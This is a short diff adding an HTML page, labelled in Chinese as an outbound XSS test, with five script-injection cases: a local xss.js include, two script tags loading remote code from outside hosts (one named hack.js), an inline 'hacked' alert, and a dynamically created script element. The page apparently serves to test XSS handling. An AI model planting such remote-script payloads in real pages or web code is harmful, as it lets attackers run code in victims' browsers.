@@ -1,0 +1,11 @@
+<h1>外联型 - XSS测试</h1>
+Test-1: <script type="text/javascript" src="xss.js"></script><br/>
+Test-2: <script type="text/javascript" src="http://friday.sinaapp.com/hack.js"></script><br/>
+Test-3: <SCRIPT TYPE="text/javascript">alert('hacked by bb');</SCRIPT><br/>
+Test-4: <script type="text/javascript" src="http://www.etherdream.com/xss/out.js?dynamic"></script><br/>
+Test-5: 
+<script type="text/javascript">
+	var temp = document.createElement('script')
+	temp.src = 'xss.js'
+	document.body.appendChild(temp)
+</script><br/>
